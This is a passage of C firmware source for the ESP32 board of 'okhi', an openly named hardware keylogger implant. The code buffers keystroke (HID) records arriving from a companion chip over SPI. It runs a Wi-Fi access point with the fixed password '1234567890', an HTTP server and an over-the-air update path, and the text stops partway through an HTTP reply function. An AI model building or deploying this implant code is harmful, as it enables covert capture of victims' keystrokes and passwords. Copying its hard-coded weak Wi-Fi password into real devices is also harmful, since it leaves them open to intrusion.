/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
*/

#ifndef __COM_ESP_H__
#define __COM_ESP_H__

#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <unistd.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_app_desc.h"
#include "esp_attr.h"
#include "esp_event.h"
#include "esp_heap_caps.h"
#include "esp_ota_ops.h"
#include "esp_partition.h"
#include "esp_log.h"
#include "esp_mac.h"
#include "esp_netif.h"
#include "esp_spiffs.h"
#include "esp_system.h"
#include "esp_timer.h"
#include "esp_wifi.h"

#include "nvs_flash.h"

#include "lwip/inet.h"
#include "lwip/sockets.h"

#include "driver/gpio.h"
#include "driver/spi_slave.h"
#include "driver/uart.h"

#include "com.h"

#define HTTP_PORT 80
#define HTTP_LISTEN_BACKLOG 8
#define HTTP_MAX_CONN 4
#define HTTP_REQ_MAX 1280
#define HTTP_BODY_MAX 1536
#define HTTP_RESP_MAX 2048
#define HTTP_HEADER_MAX 320
#define HTTP_RECV_TIMEOUT_MS 1200
#define HTTP_SEND_TIMEOUT_MS 5000
#define HTTP_SELECT_TIMEOUT_MS 200
#define HTTP_PATH_MAX 128

#define HTTP_TEXT_PLAIN "text/plain; charset=UTF-8"
#define HTTP_TEXT_HTML "text/html; charset=UTF-8"

#define ESP_WIFI_PASS "1234567890"
#define ESP_WIFI_CHANNEL CONFIG_ESP_WIFI_CHANNEL
#define MAX_STA_CONN 6

#define GTK_REKEY_INTERVAL CONFIG_ESP_GTK_REKEY_INTERVAL

#define GPIO_MOSI 7
#define GPIO_MISO 2
#define GPIO_SCLK 6
#define GPIO_CS 10

#define RCV_HOST SPI2_HOST

#define EBOOT_MASTERDATAREADY_GPIO 9
#define ELOG_SLAVEREADY_GPIO 8

#define SPI_QUEUE_DEPTH 8

#define SPI_TX_DIAGNOSTIC_FILL 0
#define SPI_BENCH_ARM_FRAMES 64

#define RP_IMAGE_PATH "/spiffs/rp.bin"
#define RP_IMAGE_TMP_PATH "/spiffs/rp.new"
#define RP_IMAGE_MAX_SIZE (512 * 1024)
#define RP_WINDOW_SIZE 4096

#define OTA_VALIDATE_TIMEOUT_MS 300000
#define OTA_REBOOT_DELAY_MS 500
#define OTA_MIN_IMAGE_SIZE 8192

#define OTA_PKG_HEADER_SIZE 32
#define OTA_PKG_FORMAT_VERSION 1
#define OTA_NVS_NAMESPACE "okhi"

#define RECORD_PAYLOAD_MAX 62
#define RING_ENTRIES 512
#define RING_MASK (RING_ENTRIES - 1)
#define RING_READABLE (RING_ENTRIES - 8)

#define RP_STATUS_MAX 128
#define HWVER_MAX 64
#define RP_LINK_STALE_MS 3000

#define UART_PORT UART_NUM_0
#define UART_TX_PIN GPIO_NUM_20
#define UART_RX_PIN GPIO_NUM_19
#define UART_RXBUF_SZ 256
#define UART_CHUNK_SIZE 64

#define LED_GPIO 0

typedef struct
{
    uint16_t len;
    uint8_t data[RECORD_PAYLOAD_MAX];
} hid_record_t;

typedef struct
{
    uint32_t spi_transactions;
    uint32_t spi_records;
    uint32_t spi_empty;
    uint32_t spi_truncated;
    uint32_t spi_errors;
    uint32_t spi_queue_errors;
    uint32_t spi_polls;
    uint32_t spi_proto_mismatch;
    uint32_t ring_dropped;
    uint32_t http_requests;
    uint32_t http_rejected;
} okhi_stats_t;

typedef enum
{
    HTTP_CONN_FREE = 0,
    HTTP_CONN_RECV,
    HTTP_CONN_BODY,
    HTTP_CONN_SEND
} http_conn_state_t;

typedef enum
{
    HTTP_BODY_NONE = 0,
    HTTP_BODY_OTA,
    HTTP_BODY_RPIMAGE
} http_body_sink_t;

typedef struct
{
    int fd;
    const uint8_t *send_ptr;
    size_t send_left;
    http_conn_state_t state;
    http_body_sink_t body_sink;
    int64_t deadline_ms;
    size_t req_len;
    size_t body_expected;
    size_t body_received;
    size_t resp_len;
    size_t resp_sent;
    char req[HTTP_REQ_MAX];
    char resp[HTTP_RESP_MAX];
} http_conn_t;

static hid_record_t hid_ring[RING_ENTRIES];
static volatile uint32_t hid_ring_write;

static okhi_stats_t stats;

static char rp_status[2][RP_STATUS_MAX];
static volatile uint8_t rp_status_index;

static char hw_version[HWVER_MAX];
static bool hw_version_known;

static char rp_identity[SPI_IDENTITY_MAX];
static uint8_t rp_frame_version;
static volatile uint32_t rp_last_seen_ms;

static http_conn_t http_conns[HTTP_MAX_CONN];
static char http_body[HTTP_BODY_MAX];
static uint32_t http_legacy_cursor;

static esp_ota_handle_t ota_handle;
static const esp_partition_t *ota_partition;
static bool ota_active;
static bool ota_reboot_pending;

static bool app_awaiting_validation;
static bool app_booted_pending;
static int64_t app_validation_deadline_ms;

typedef enum
{
    OTA_STAGE_HEADER = 0,
    OTA_STAGE_ESP,
    OTA_STAGE_RP,
    OTA_STAGE_DONE
} ota_stage_t;

static ota_stage_t ota_stage;
static uint8_t ota_header[OTA_PKG_HEADER_SIZE];
static size_t ota_header_got;
static bool ota_is_package;
static uint32_t ota_esp_len;
static uint32_t ota_esp_crc;
static uint32_t ota_esp_got;
static uint32_t ota_esp_running;
static uint32_t ota_rp_len;
static uint32_t ota_rp_crc;
static uint32_t ota_rp_got;
static uint32_t ota_rp_running;
static bool ota_esp_validated;
static bool ota_rp_validated;
static bool rp_commit_pending;
static volatile bool rp_commit_completed;
static volatile bool rp_image_in_use;
static http_conn_t *upload_owner;
static char ota_last_error[96];
static uint32_t ota_uploads_ok;
static uint32_t ota_uploads_failed;

static WORD_ALIGNED_ATTR uint8_t spi_rx_buffers[SPI_QUEUE_DEPTH][SPI_FRAME_SIZE];
static WORD_ALIGNED_ATTR uint8_t spi_tx_buffers[SPI_QUEUE_DEPTH][SPI_FRAME_SIZE];
static spi_slave_transaction_t spi_transactions[SPI_QUEUE_DEPTH];

static const uint8_t spi_frame_magic[4] = {SPI_FRAME_MAGIC_BYTES};
static const uint8_t spi_ctrl_magic[4] = {SPI_CTRL_MAGIC_BYTES};

static uint32_t spi_bench_ms;
static volatile uint32_t spi_bench_frames_left;

static volatile uint32_t rp_image_size;
static volatile uint32_t rp_image_crc;
static volatile bool rp_image_ready;
static volatile int rp_image_fd = -1;
static uint8_t rp_window[RP_WINDOW_SIZE];
static uint32_t rp_window_offset = SPI_NO_BLOCK;
static volatile uint32_t spi_requested_block = SPI_NO_BLOCK;
static volatile uint32_t rp_commit_frames_left;
static uint32_t spi_blocks_served;

static uint32_t spi_last_empty_bits;
static uint8_t spi_last_empty_head[8];
static uint32_t spi_last_record_bits;

static const char *TAG = "okhi";
static const char *HTTP_TAG = "http";
static const char *SPI_TAG = "spi";
static const char *UART_TAG = "uart";
static const char *SPIFFS_TAG = "spiffs";
static const char *WIFI_TAG = "wifi";

static void blink_led_n(int n)
{
    gpio_config_t io = {.pin_bit_mask = 1ULL << LED_GPIO,
                        .mode = GPIO_MODE_OUTPUT,
                        .pull_up_en = GPIO_PULLUP_DISABLE,
                        .pull_down_en = GPIO_PULLDOWN_DISABLE,
                        .intr_type = GPIO_INTR_DISABLE};

    gpio_config(&io);
    vTaskDelay(pdMS_TO_TICKS(500));

    for (int i = 0; i < n; ++i)
    {
        gpio_set_level(LED_GPIO, 1);
        vTaskDelay(pdMS_TO_TICKS(500));
        gpio_set_level(LED_GPIO, 0);
        vTaskDelay(pdMS_TO_TICKS(500));
    }
}

static void led_task(void *arg)
{
    (void)arg;

    blink_led_n(3);
    vTaskDelete(NULL);
}

static void spiffs_init(void)
{
    esp_vfs_spiffs_conf_t conf = {
        .base_path = "/spiffs", .partition_label = "storage", .max_files = 12, .format_if_mount_failed = true};

    esp_err_t ret = esp_vfs_spiffs_register(&conf);
    if (ret != ESP_OK)
    {
        ESP_LOGE(SPIFFS_TAG, "error mounting SPIFFS (%s)", esp_err_to_name(ret));
        return;
    }

    size_t total = 0;
    size_t used = 0;
    if (esp_spiffs_info(conf.partition_label, &total, &used) == ESP_OK)
    {
        ESP_LOGI(SPIFFS_TAG, "SPIFFS total=%u used=%u", (unsigned)total, (unsigned)used);
    }
}

static uint32_t hid_ring_head(void)
{
    return __atomic_load_n(&hid_ring_write, __ATOMIC_ACQUIRE);
}

static void hid_ring_publish(const uint8_t *src, size_t len)
{
    if (len > RECORD_PAYLOAD_MAX)
    {
        len = RECORD_PAYLOAD_MAX;
        stats.spi_truncated++;
    }

    uint32_t index = hid_ring_write;
    hid_record_t *slot = &hid_ring[index & RING_MASK];

    slot->len = (uint16_t)len;
    memcpy(slot->data, src, len);

    __atomic_store_n(&hid_ring_write, index + 1, __ATOMIC_RELEASE);
}

static bool hid_ring_read(uint32_t index, hid_record_t *out)
{
    const hid_record_t *slot = &hid_ring[index & RING_MASK];

    uint16_t len = slot->len;
    if (len > RECORD_PAYLOAD_MAX)
    {
        len = RECORD_PAYLOAD_MAX;
    }

    memcpy(out->data, slot->data, len);
    out->len = len;

    return (hid_ring_head() - index) <= RING_ENTRIES;
}

static uint32_t hid_ring_clamp(uint32_t cursor, uint32_t head, uint32_t *skipped)
{
    *skipped = 0;

    if ((int32_t)(cursor - head) > 0)
    {
        return head;
    }

    uint32_t pending = head - cursor;
    if (pending > RING_READABLE)
    {
        *skipped = pending - RING_READABLE;
        return head - RING_READABLE;
    }

    return cursor;
}

static void IRAM_ATTR spi_post_setup_cb(spi_slave_transaction_t *trans)
{
    (void)trans;
    gpio_set_level(ELOG_SLAVEREADY_GPIO, 1);
}

static void IRAM_ATTR spi_post_trans_cb(spi_slave_transaction_t *trans)
{
    (void)trans;
    gpio_set_level(ELOG_SLAVEREADY_GPIO, 0);
}

static uint32_t crc32_update(uint32_t crc, const uint8_t *data, size_t len)
{
    static const uint32_t table[16] = {0x00000000, 0x1db71064, 0x3b6e20c8, 0x26d930ac, 0x76dc4190, 0x6b6b51f4,
                                       0x4db26158, 0x5005713c, 0xedb88320, 0xf00f9344, 0xd6d6a3e8, 0xcb61b38c,
                                       0x9b64c2b0, 0x86d3d2d4, 0xa00ae278, 0xbdbdf21c};

    for (size_t i = 0; i < len; ++i)
    {
        crc ^= data[i];
        crc = (crc >> 4) ^ table[crc & 0x0f];
        crc = (crc >> 4) ^ table[crc & 0x0f];
    }

    return crc;
}

static uint32_t crc32_buffer(const uint8_t *data, size_t len)
{
    return crc32_update(0xffffffffu, data, len) ^ 0xffffffffu;
}

static void spi_put_u32(uint8_t *dst, uint32_t value)
{
    dst[0] = (uint8_t)value;
    dst[1] = (uint8_t)(value >> 8);
    dst[2] = (uint8_t)(value >> 16);
    dst[3] = (uint8_t)(value >> 24);
}

static uint32_t spi_get_u32(const uint8_t *src)
{
    return (uint32_t)src[0] | ((uint32_t)src[1] << 8) | ((uint32_t)src[2] << 16) | ((uint32_t)src[3] << 24);
}

static bool spi_is_control_frame(const uint8_t *data)
{
    return memcmp(data, spi_ctrl_magic, sizeof(spi_ctrl_magic)) == 0;
}

static bool rp_image_load_window(uint32_t offset)
{
    if (rp_image_fd < 0)
    {
        return false;
    }

    if (lseek(rp_image_fd, (off_t)offset, SEEK_SET) != (off_t)offset)
    {
        return false;
    }

    int got = read(rp_image_fd, rp_window, RP_WINDOW_SIZE);
    if (got <= 0)
    {
        return false;
    }

    if ((size_t)got < RP_WINDOW_SIZE)
    {
        memset(rp_window + got, 0, RP_WINDOW_SIZE - (size_t)got);
    }

    rp_window_offset = offset;

    return true;
}

static void spi_fill_frame(uint8_t *frame)
{
    if (SPI_TX_DIAGNOSTIC_FILL == 1)
    {
        memset(frame, 0xFF, SPI_FRAME_SIZE);
        return;
    }

    if (SPI_TX_DIAGNOSTIC_FILL == 2)
    {
        for (size_t i = 0; i < SPI_FRAME_SIZE; ++i)
        {
            frame[i] = (uint8_t)(0xA0 + i);
        }

        return;
    }

    memset(frame, 0, SPI_FRAME_SIZE);

    uint8_t *head = frame + SPI_FRAME_LEAD;

    memcpy(head, spi_frame_magic, sizeof(spi_frame_magic));

    head[4] = SPI_FRAME_VERSION;
    head[5] = SPI_FRAME_TYPE_STATUS;
    head[6] = (uint8_t)FIRMV;

    uint8_t flags = 0;

    if (spi_bench_frames_left > 0)
    {
        spi_bench_frames_left--;
        flags |= SPI_FLAG_BENCH_ARMED;
        spi_put_u32(head + 8, spi_bench_ms);
    }

    if (rp_image_ready && !ota_reboot_pending)
    {
        flags |= SPI_FLAG_RP_IMAGE_READY;
        spi_put_u32(head + 12, rp_image_size);
        spi_put_u32(head + 16, rp_image_crc);
    }

    if (rp_commit_frames_left > 0)
    {
        rp_commit_frames_left--;
        flags |= SPI_FLAG_RP_COMMIT;
    }

    if (rp_commit_pending && !app_awaiting_validation && !ota_reboot_pending)
    {
        flags |= SPI_FLAG_RP_COMMIT;
    }

    head[7] = flags;
    spi_put_u32(head + 20, SPI_NO_BLOCK);

    uint32_t block = spi_requested_block;
    uint32_t size = rp_image_size;

    if (!rp_image_ready || block == SPI_NO_BLOCK || block > (RP_IMAGE_MAX_SIZE / SPI_BLOCK_PAYLOAD))
    {
        return;
    }

    uint32_t offset = block * SPI_BLOCK_PAYLOAD;

    if (size == 0 || offset >= size)
    {
        return;
    }

    uint32_t window = offset & ~(uint32_t)(RP_WINDOW_SIZE - 1);

    rp_image_in_use = true;

    if (window != rp_window_offset && !rp_image_load_window(window))
    {
        rp_image_in_use = false;
        return;
    }

    if (!rp_image_ready || rp_image_size != size)
    {
        rp_image_in_use = false;
        return;
    }

    uint32_t remaining = size - offset;
    uint16_t len = (uint16_t)(remaining < SPI_BLOCK_PAYLOAD ? remaining : SPI_BLOCK_PAYLOAD);

    head[5] = SPI_FRAME_TYPE_DATA;
    spi_put_u32(head + 20, block);
    head[24] = (uint8_t)len;
    head[25] = (uint8_t)(len >> 8);

    memcpy(frame + SPI_PAYLOAD_OFFSET, rp_window + (offset - window), len);

    rp_image_in_use = false;

    spi_blocks_served++;
}

static void spi_handle_control_frame(const uint8_t *frame)
{
    stats.spi_polls++;

    rp_frame_version = frame[4];
    rp_last_seen_ms = (uint32_t)(esp_timer_get_time() / 1000);

    if (memcmp(rp_identity, frame + SPI_IDENTITY_OFFSET, SPI_IDENTITY_MAX - 1) != 0)
    {
        memcpy(rp_identity, frame + SPI_IDENTITY_OFFSET, SPI_IDENTITY_MAX - 1);
        rp_identity[SPI_IDENTITY_MAX - 1] = '\0';

        for (size_t i = 0; i < SPI_IDENTITY_MAX - 1; ++i)
        {
            if (rp_identity[i] != '\0' && (rp_identity[i] < 0x20 || rp_identity[i] > 0x7E))
            {
                rp_identity[i] = '?';
            }
        }
    }

    if (frame[4] != SPI_FRAME_VERSION)
    {
        stats.spi_proto_mismatch++;
        return;
    }

    uint32_t reported_app_crc = spi_get_u32(frame + 12);

    if (rp_commit_pending && rp_image_ready && reported_app_crc != 0 && reported_app_crc == rp_image_crc)
    {
        rp_commit_completed = true;
    }

    if (frame[5] == SPI_CTRL_TYPE_REQUEST_BLOCK)
    {
        spi_requested_block = spi_get_u32(frame + 8);
    }
}

static size_t spi_payload_length(const uint8_t *data)
{
    size_t len = 0;

    while (len < SPI_FRAME_SIZE && data[len] != 0)
    {
        len++;
    }

    return len;
}

static void spi_task(void *arg)
{
    (void)arg;

    spi_bus_config_t buscfg = {
        .mosi_io_num = GPIO_MOSI,
        .miso_io_num = GPIO_MISO,
        .sclk_io_num = GPIO_SCLK,
        .quadwp_io_num = -1,
        .quadhd_io_num = -1,
    };

    spi_slave_interface_config_t slvcfg = {
        .spics_io_num = GPIO_CS,
        .flags = 0,
        .queue_size = SPI_QUEUE_DEPTH,
        .mode = 0,
        .post_setup_cb = spi_post_setup_cb,
        .post_trans_cb = spi_post_trans_cb,
    };

    gpio_config_t slave_ready_conf = {
        .pin_bit_mask = BIT64(ELOG_SLAVEREADY_GPIO),
        .mode = GPIO_MODE_OUTPUT,
        .pull_up_en = GPIO_PULLUP_DISABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE,
    };

    gpio_config_t master_ready_conf = {
        .pin_bit_mask = BIT64(EBOOT_MASTERDATAREADY_GPIO),
        .mode = GPIO_MODE_INPUT,
        .pull_up_en = GPIO_PULLUP_ENABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type = GPIO_INTR_DISABLE,
    };

    gpio_config(&slave_ready_conf);
    gpio_set_level(ELOG_SLAVEREADY_GPIO, 0);
    gpio_config(&master_ready_conf);

    gpio_set_pull_mode(GPIO_MOSI, GPIO_PULLUP_ONLY);
    gpio_set_pull_mode(GPIO_SCLK, GPIO_PULLUP_ONLY);
    gpio_set_pull_mode(GPIO_CS, GPIO_PULLUP_ONLY);

    ESP_ERROR_CHECK(spi_slave_initialize(RCV_HOST, &buscfg, &slvcfg, SPI_DMA_CH_AUTO));

    for (int i = 0; i < SPI_QUEUE_DEPTH; ++i)
    {
        memset(spi_rx_buffers[i], 0, SPI_FRAME_SIZE);
        spi_fill_frame(spi_tx_buffers[i]);

        spi_transactions[i].flags = 0;
        spi_transactions[i].length = SPI_FRAME_SIZE * 8;
        spi_transactions[i].trans_len = 0;
        spi_transactions[i].tx_buffer = spi_tx_buffers[i];
        spi_transactions[i].rx_buffer = spi_rx_buffers[i];
        spi_transactions[i].user = (void *)(intptr_t)i;

        ESP_ERROR_CHECK(spi_slave_queue_trans(RCV_HOST, &spi_transactions[i], portMAX_DELAY));
    }

    ESP_LOGI(SPI_TAG, "slave armed with %d queued transactions", SPI_QUEUE_DEPTH);

    while (1)
    {
        spi_slave_transaction_t *done = NULL;

        esp_err_t err = spi_slave_get_trans_result(RCV_HOST, &done, portMAX_DELAY);
        if (err != ESP_OK || done == NULL)
        {
            stats.spi_errors++;
            vTaskDelay(1);
            continue;
        }

        stats.spi_transactions++;

        uint8_t *received = (uint8_t *)done->rx_buffer;

        if (spi_is_control_frame(received))
        {
            spi_handle_control_frame(received);
        }
        else
        {
            size_t len = spi_payload_length(received);

            if (len > 0)
            {
                hid_ring_publish(received, len);
                stats.spi_records++;
                spi_last_record_bits = (uint32_t)done->trans_len;
            }
            else
            {
                stats.spi_empty++;
                spi_last_empty_bits = (uint32_t)done->trans_len;
                memcpy(spi_last_empty_head, received, sizeof(spi_last_empty_head));
            }
        }

        int index = (int)(intptr_t)done->user;

        memset(received, 0, SPI_FRAME_SIZE);

        if (index >= 0 && index < SPI_QUEUE_DEPTH)
        {
            spi_fill_frame(spi_tx_buffers[index]);
        }

        done->trans_len = 0;

        if (spi_slave_queue_trans(RCV_HOST, done, portMAX_DELAY) != ESP_OK)
        {
            stats.spi_queue_errors++;
        }
    }
}

static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data)
{
    (void)arg;
    (void)event_base;

    if (event_id == WIFI_EVENT_AP_STACONNECTED)
    {
        wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t *)event_data;
        ESP_LOGI(WIFI_TAG, "station " MACSTR " join, AID=%d", MAC2STR(event->mac), event->aid);
    }
    else if (event_id == WIFI_EVENT_AP_STADISCONNECTED)
    {
        wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t *)event_data;
        ESP_LOGI(WIFI_TAG, "station " MACSTR " leave, AID=%d, reason=%d", MAC2STR(event->mac), event->aid,
                 event->reason);
    }
}

static void wifi_init_softap(void)
{
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL));

    wifi_config_t wifi_config = {
        .ap =
            {
                .channel = ESP_WIFI_CHANNEL,
                .password = ESP_WIFI_PASS,
                .max_connection = MAX_STA_CONN,
                .authmode = WIFI_AUTH_WPA2_PSK,
                .pmf_cfg =
                    {
                        .capable = true,
                        .required = false,
                    },
                .gtk_rekey_interval = GTK_REKEY_INTERVAL,
            },
    };

    if (strlen(ESP_WIFI_PASS) == 0)
    {
        wifi_config.ap.authmode = WIFI_AUTH_OPEN;
    }

    uint8_t mac[6] = {0};
    ESP_ERROR_CHECK(esp_read_mac(mac, ESP_MAC_WIFI_SOFTAP));

    char ssid[32] = {0};
    int n = snprintf(ssid, sizeof(ssid), "%s_%02X%02X%02X%02X%02X%02X", WIFI_PREFIX, mac[0], mac[1], mac[2], mac[3],
                     mac[4], mac[5]);

    memcpy(wifi_config.ap.ssid, ssid, n);
    wifi_config.ap.ssid_len = n;

    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    ESP_LOGI(WIFI_TAG, "wifi_init_softap SSID:%s password:%s channel:%d", ssid, ESP_WIFI_PASS, ESP_WIFI_CHANNEL);
}

static void uart_init(void)
{
    uart_config_t cfg = {
        .baud_rate = RP_UART_BAUD,
        .data_bits = UART_DATA_8_BITS,
        .parity = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_DEFAULT,
    };

    ESP_ERROR_CHECK(uart_param_config(UART_PORT, &cfg));
    ESP_ERROR_CHECK(uart_set_pin(UART_PORT, UART_TX_PIN, UART_RX_PIN, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE));
    ESP_ERROR_CHECK(uart_driver_install(UART_PORT, UART_RXBUF_SZ, 0, 0, NULL, 0));
}

static void rp_status_snapshot(char *out, size_t out_size)
{
    uint8_t index = __atomic_load_n(&rp_status_index, __ATOMIC_ACQUIRE);

    snprintf(out, out_size, "%s", rp_status[index & 1]);
}

static void rp_status_publish(const uint8_t *chunk, size_t len)
{
    uint8_t next = (uint8_t)((rp_status_index & 1) ^ 1);
    char *target = rp_status[next];

    size_t used = 0;
    for (size_t i = 0; i < len && used + 1 < RP_STATUS_MAX; ++i)
    {
        if (chunk[i] == 0)
        {
            continue;
        }

        target[used++] = (chunk[i] >= 0x20 && chunk[i] <= 0x7E) ? (char)chunk[i] : '?';
    }

    target[used] = '\0';

    __atomic_store_n(&rp_status_index, next, __ATOMIC_RELEASE);
}

static void uart_rx_task(void *arg)
{
    (void)arg;

    uint8_t chunk[UART_CHUNK_SIZE];

    while (1)
    {
        int len = uart_read_bytes(UART_PORT, chunk, sizeof(chunk), pdMS_TO_TICKS(100));
        if (len <= 1)
        {
            continue;
        }

        ESP_LOGD(UART_TAG, "received %d bytes from the RP", len);
        rp_status_publish(chunk, (size_t)len);
    }
}

static int64_t http_now_ms(void)
{
    return esp_timer_get_time() / 1000;
}

static int rp_upload_fd = -1;
static uint32_t rp_upload_crc;

static void ota_cleanup(void)
{
    if (ota_active)
    {
        esp_ota_abort(ota_handle);
        ota_active = false;
    }

    ota_partition = NULL;

    if (rp_upload_fd >= 0)
    {
        close(rp_upload_fd);
        rp_upload_fd = -1;
        unlink(RP_IMAGE_TMP_PATH);
    }
}

static void rp_upload_cleanup(void)
{
    if (rp_upload_fd >= 0)
    {
        close(rp_upload_fd);
        rp_upload_fd = -1;
        unlink(RP_IMAGE_TMP_PATH);
    }
}

static void rp_image_invalidate(void)
{
    __atomic_store_n(&rp_image_ready, false, __ATOMIC_SEQ_CST);

    while (rp_image_in_use)
    {
        vTaskDelay(1);
    }

    rp_commit_pending = false;

    spi_requested_block = SPI_NO_BLOCK;
    rp_window_offset = SPI_NO_BLOCK;
    rp_image_size = 0;
    rp_image_crc = 0;

    if (rp_image_fd >= 0)
    {
        close(rp_image_fd);
        rp_image_fd = -1;
    }
}

static bool rp_image_verify_on_disk(int fd, uint32_t expected_size, uint32_t expected_crc)
{
    if (lseek(fd, 0, SEEK_SET) != 0)
    {
        return false;
    }

    uint32_t crc = 0xffffffffu;
    uint32_t total = 0;

    while (1)
    {
        int got = read(fd, rp_window, RP_WINDOW_SIZE);

        if (got < 0)
        {
            return false;
        }

        if (got == 0)
        {
            break;
        }

        crc = crc32_update(crc, rp_window, (size_t)got);
        total += (uint32_t)got;

        if (total > expected_size)
        {
            return false;
        }
    }

    rp_window_offset = SPI_NO_BLOCK;

    return total == expected_size && (crc ^ 0xffffffffu) == expected_crc;
}

static void app_validation_init(void)
{
    const esp_partition_t *running = esp_ota_get_running_partition();
    esp_ota_img_states_t state = ESP_OTA_IMG_UNDEFINED;

    if (running == NULL || esp_ota_get_state_partition(running, &state) != ESP_OK)
    {
        return;
    }

    if (state != ESP_OTA_IMG_PENDING_VERIFY)
    {
        return;
    }

    app_awaiting_validation = true;
    app_booted_pending = true;
    app_validation_deadline_ms = http_now_ms() + OTA_VALIDATE_TIMEOUT_MS;

    ESP_LOGW(TAG, "running an unconfirmed image, waiting for the first HTTP request");
}

static void app_validation_confirm(void)
{
    if (!app_awaiting_validation)
    {
        return;
    }

    app_awaiting_validation = false;

    if (esp_ota_mark_app_valid_cancel_rollback() == ESP_OK)
    {
        ESP_LOGI(TAG, "image confirmed, rollback cancelled");
    }
}

static void app_validation_check_timeout(int64_t now)
{
    if (!app_awaiting_validation || now <= app_validation_deadline_ms)
    {
        return;
    }

    ESP_LOGE(TAG, "image not confirmed in time, rebooting to roll back");
    esp_restart();
}

static void http_conn_close(http_conn_t *conn)
{
    if (conn->state == HTTP_CONN_BODY && conn == upload_owner)
    {
        if (conn->body_sink == HTTP_BODY_OTA)
        {
            ota_cleanup();
        }
        else
        {
            rp_upload_cleanup();
        }
    }

    if (conn == upload_owner)
    {
        upload_owner = NULL;
    }

    conn->body_sink = HTTP_BODY_NONE;

    conn->send_ptr = NULL;
    conn->send_left = 0;

    if (conn->fd >= 0)
    {
        close(conn->fd);
        conn->fd = -1;
    }

    conn->state = HTTP_CONN_FREE;
    conn->req_len = 0;
    conn->resp_len = 0;
    conn->resp_sent = 0;
}

static void http_reply(http_conn_t *conn, const char *status, const char *content_type, const char *extra_headers,
                       const char *body, size_t body_len)
{
    char header[HTTP_HEADER_MAX];

    int header_len = snprintf(header, sizeof(header),
                              "HTTP/1.1 %s\r\n"
                              "Content-Type: %s\r\n"
                              "Content-Length: %u\r\n"
                              "Cache-Control: no-store\r\n"
                              "Connection: close\r\n"
                              "%s"
                              "\r\n",
                              status, content_type, (unsigned)body_len, extra_headers ? extra_headers : "");

    if (header_len <= 0 || (size_t)header_len >= sizeof(header) ||
        (size_t)header_len + body_len > sizeof(conn->resp))
    {
        const char *fallback = "HTTP/1.1 500 Internal Server Error\r\n"
                               "Content-Length: 0\r\n"
                               "Connection: close\r\n"
                               "\r\n";

        conn->resp_len = strlen(fallback);
        conn->resp_sent = 0;
        memcpy(conn->resp, fallback, conn->resp_len);
        return;
    }

    memcpy(conn->resp, header, (size_t)header_len);
    if (body_len > 0)
    {
        memcpy(conn->resp + header_len, body, body_len);
    }

    conn->resp_len = (size_t)header_len + body_len;
    conn->resp_sent = 0;
}

static void http_reply_no_content(http_conn_t *conn, const char *extra_headers)
{
    int len = snprintf(conn->resp, sizeof(conn->resp),
                       "HTTP/1.1 204 No Content\r\n"
                       "Cache-Control: no-store\r\n"
                       "Connection: close\r\n"
                       "%s"
                       "\r\n",
                       extra_headers ? extra_headers : "");

    conn->resp_len = (len > 0 && (size_t)len < sizeof(conn->resp)) ? (size_t)len : 0;
    conn->resp_sent = 0;
}

static void http_reply_text(http_conn_t *conn, const char *status, const char *body)
{
    http_reply(conn, status, HTTP_TEXT_PLAIN, NULL, body, strlen(body));
}

extern const uint8_t index_html_gz_start[] asm("_binary_index_html_gz_start");
extern const uint8_t index_html_gz_end[] asm("_binary_index_html_gz_end");

static void http_reply_index(http_conn_t *conn)
{
    size_t size = (size_t)(index_html_gz_end - index_html_gz_start);

    int header_len = snprintf(conn->resp, sizeof(conn->resp),
                              "HTTP/1.1 200 OK\r\n"
                              "Content-Type: " HTTP_TEXT_HTML "\r\n"
                              "Content-Encoding: gzip\r\n"
                              "Content-Length: %u\r\n"
                              "Cache-Control: no-cache\r\n"
                              "Connection: close\r\n"
                              "\r\n",
                              (unsigned)size);

